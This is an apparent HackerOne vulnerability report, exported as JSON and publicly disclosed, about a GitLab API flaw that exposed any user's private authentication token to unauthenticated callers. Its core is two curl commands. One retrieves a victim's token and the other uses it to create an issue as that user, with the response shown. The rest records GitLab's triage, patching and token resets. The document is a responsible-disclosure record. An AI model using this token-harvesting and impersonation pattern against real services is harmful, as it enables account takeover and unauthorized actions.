{"id":268794,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjg3OTQ=","url":"https://hackerone.com/reports/268794","title":"all private tokens are leaked to an unauthenticated attacker","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-09-15T22:13:20.680Z","submitted_at":"2017-09-15T22:13:20.680Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"rpearl","url":"/rpearl","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/200/455/0aa46e9dc9085994437312179a282024b5ef0908_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-09-21T13:55:55.437Z","bug_reporter_agreed_on_going_public_at":"2017-09-21T02:00:23.195Z","team_member_agreed_on_going_public_at":"2017-09-21T13:55:55.399Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Using the api, one can obtain the authentication token for any user on gitlab:\n```\n$ curl -s --request GET https://gitlab.com/api/v4/users/951422 | jq '.authentication_token'\n\"[redacted]\"\n```\n\nWe can then use this token to impersonate any user to perform any action they can perform:\n```$ curl --request POST --header \"PRIVATE-TOKEN: [redacted]\" https://gitlab.com/api/v4/projects/3831210/issues?title=owned```\n\n```\n{\"id\":6843690,\"iid\":4,\"project_id\":3831210,\"title\":\"owned\",\"description\":\"\",\"state\":\"opened\",\"created_at\":\"2017-09-15T21:58:06.342Z\",\"updated_at\":\"2017-09-15T21:58:06.342Z\",\"labels\":[],\"milestone\":null,\"assignees\":[],\"author\":{\"id\":951422,\"name\":\"Andrew Drake\",\"username\":\"adrake\",\"state\":\"active\",\"avatar_url\":\"https://secure.gravatar.com/avatar/5cd00179addefbca6d635845534a1ee6?s=80\u0026d=identicon\",\"web_url\":\"https://gitlab.com/adrake\"},\"assignee\":null,\"user_notes_count\":0,\"upvotes\":0,\"downvotes\":0,\"due_date\":null,\"confidential\":false,\"weight\":null,\"web_url\":\"https://gitlab.com/karmiclabs/slabricator/issues/4\",\"time_stats\":{\"time_estimate\":0,\"total_time_spent\":0,\"human_time_estimate\":null,\"human_total_time_spent\":null},\"_links\":{\"self\":\"http://gitlab.com/api/v4/projects/3831210/issues/4\",\"notes\":\"http://gitlab.com/api/v4/projects/3831210/issues/4/notes\",\"award_emoji\":\"http://gitlab.com/api/v4/projects/3831210/issues/4/award_emoji\",\"project\":\"http://gitlab.com/api/v4/projects/3831210\"},\"subscribed\":true}\n```\n\n","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-10-21T02:00:23.241Z","allow_singular_disclosure_after":-125411646.45363434,"singular_disclosure_allowed":true,"vote_count":20,"voters":["flamezzz","sp1d3rs","smiegles","michiel","frozensolid","ysx","edoverflow","xsam","eveeez","r3y","and 10 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2000567,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @rpearl,\n\nThanks very much for the report. We've verified your finding and opened a confidential issue for discussion and remediation: https://gitlab.com/gitlab-org/gitlab-ce/issues/37946. That issue will be opened to the public when a patch is released.\n\nThankfully this appears to have been introduced in one of our 10.0 Release Candidates and should not affect instances other than GitLab.com. I'll keep you updated on our progress here. Please feel free to contact us at any time for an update. ","automated_response":false,"created_at":"2017-09-15T22:35:43.394Z","updated_at":"2017-09-15T22:35:43.394Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2000811,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @briann. Looks like the fix was deployed earlier and is now making its way into the public codebase. Let me know once it's public!\n\nI am pretty sure this bug could have been used (combined with some carefully planned commits) for RCE on gitlab.com--or, separately, anyone using gitlab's CI, so I'm happy it got a very fast fix.","automated_response":false,"created_at":"2017-09-16T01:42:18.400Z","updated_at":"2017-09-16T01:42:18.400Z","actor":{"username":"rpearl","cleared":false,"url":"/rpearl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/200/455/0aa46e9dc9085994437312179a282024b5ef0908_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2000841,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, it's a very serious bug and we're very thankful that you found and reported it to us. We've rolled out patches to all of our systems running the release candidate and we're in the process of performing a full investigation to determine the impact. We want to make sure we uncover all affected accounts so we can contact the users and ensure that no further harm was done. Until then we'd prefer to keep this quiet, of course.\n\nWe also had a support ticket opened by Arian with KarmicLabs so we're communicating via that route too.\n\nWe already have developers working on implementing a solution to ensure that these User objects don't fall victim to this type of disclosure again. And our security team is working on additional static analysis and network checks to pick this up should it occur again. \n\nFeel free to contact us here or via the support ticket. While I expect our investigation of affected users to conclude soon it will likely be next Monday before new packages are published. Thanks again!","automated_response":false,"created_at":"2017-09-16T02:41:28.591Z","updated_at":"2017-09-16T02:41:28.591Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2004702,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@rpearl Hi Ryan. As Brian mentioned, we patched our systems on Friday evening after your initial report.\n\nSince then, we've ensured the fix is in our `master` branches for CE and EE, as well as the `10-0-stable` branches from which our packages are built. That will cover people installing GitLab \"from source\".\n\nRC4 packages, which were built from the stable branches this morning and which contain the fix, are now available to everyone installing via Omnibus packages. We recently finished deploying gitlab.com from an RC4 package and have verified the fix is still in place.\n\nWe've also completed our investigation into potential exploitation of this vulnerability and have determined that no malicious activity appears to have taken place. We identified a very small subset of users who *potentially* had their access tokens exposed and have reset their personal access, RSS, and incoming email tokens as a precaution. Those users will receive the email notification I've attached here.\n\nThank you again for the report!","automated_response":false,"created_at":"2017-09-18T22:34:26.916Z","updated_at":"2017-09-18T22:40:25.740Z","actor":{"username":"rspeicher","cleared":false,"url":"/rspeicher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/070/800/771703800f32dcb0c5413919f04f19305041dd58_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":222010,"filename":"Screen_Shot_2017-09-18_at_6.20.20_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/222/010/75f82b90c697b3e605de297d692d07eec1fd9cd3/Screen_Shot_2017-09-18_at_6.20.20_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-09-18_at_6.20.20_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-09-18_at_6.20.20_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ67VGDS6J%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143429Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIBUTJ%2BNbh3iGCDafndtBQHkqG1OchqwWgdsmguvhgcLdAiAZVuUXVW1VaXDOlTKJW4MkHKw5%2BpgOTsVzeaztjAVXniqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMAWL4B0QSi4hczgSpKtcD3VOAKPL2y75%2FC3vWJu4CxM2H0MhpokFUEt9l4V7Gq%2BkP2JZRIvSX1xKqm2Gk%2BJRjjqXa9QVImay%2FdjekrRmCYTSSDt9dxM0L0oVJr7N6F8ODRv2P7lMfnzU0QMlpmHbiPpiQb5vSlaxU6jX1ESO3u1VQpKIm%2B7BGH6YiJgHcf9pDdPJ24QxGmfk3jwQevnf60P1KEwb1KLJ2JtKpPhawQ8CP%2Fp%2B8Udd6EL0VEe2hP01M49Skdizp3cnpjBBz%2FKaJPQOVb%2FxLwhTaiAm4Gs7LWex0SieNQGn7QnS8LjaHWQ69N6yv2yl5daZ0uO8CMISq44OuSORn5NNfE6Wx49Y1QtLur%2BY0bpfImT2%2Bc3AvhGI16NMEhk5qpUfU2p6NU4IF0P6m2durenSRqQWtxyQafE31VSJU%2FhpOLcgkiLcYO84tTOPewOIMl9iBrNtCggjBX8%2FrEvRnKduv0F4uzhgiTrLXMqiHsoMRJfAlsnKSaskF2MN%2FW8oUK%2Fx2WHxpYJSGLi98vCnAnrjkI1O0VdepFdfxg4xzpi25EpMuF10ISO7%2BOVlPuH4gcxSmKXq2nnWHAyNBbYGCcXKMdnH%2BrKVSQO3JfLw8lTFoTNA9axFJVvLPV3N6%2FondMJKHkYsGOqYBXTEQgnOCUR6Njz81XybrbzJvU1Pc2hk4bMTrt1%2BCSeA%2FbFO392%2FoWlFJGmK4bl3JexiICV3H2r69Blx%2FAIbSxJ4%2Bl1Ric4x9veCmMmxtb3M7uvCDvG9rrJjEd5V99ttvzT1tURyLC0o%2FETycAhpeR4E%2BNiVWXOm1S8L2NA83yPbiobo0yaywdayHxWpEhNSXoJ8gkKAiNtIC0AZekCrrrdnKzbLEBw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f60b517ee23eddee7f756a1523254fa67701dbe3816726e49b6b336769796f80"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2010280,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@rpearl,\n\nThanks again! Nice talking to you on the call today. I've attached a swag code for some GitLab swag if you'd like some free stuff. If you decide to disclose this publicly we'll be happy to approve. Just please let me know when you've used the swag code so I can redact it before the report is opened to the public.\n\n████████","automated_response":false,"created_at":"2017-09-21T00:07:29.950Z","updated_at":"2017-09-21T13:56:07.977Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"rpearl","url":"/rpearl"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2010415,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks! All set.","automated_response":false,"created_at":"2017-09-21T02:00:23.212Z","updated_at":"2017-09-21T02:00:23.212Z","first_to_agree":true,"actor":{"username":"rpearl","cleared":false,"url":"/rpearl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/200/455/0aa46e9dc9085994437312179a282024b5ef0908_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2011436,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-09-21T13:55:55.418Z","updated_at":"2017-09-21T13:55:55.418Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2011437,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-09-21T13:55:55.454Z","updated_at":"2017-09-21T13:55:55.454Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}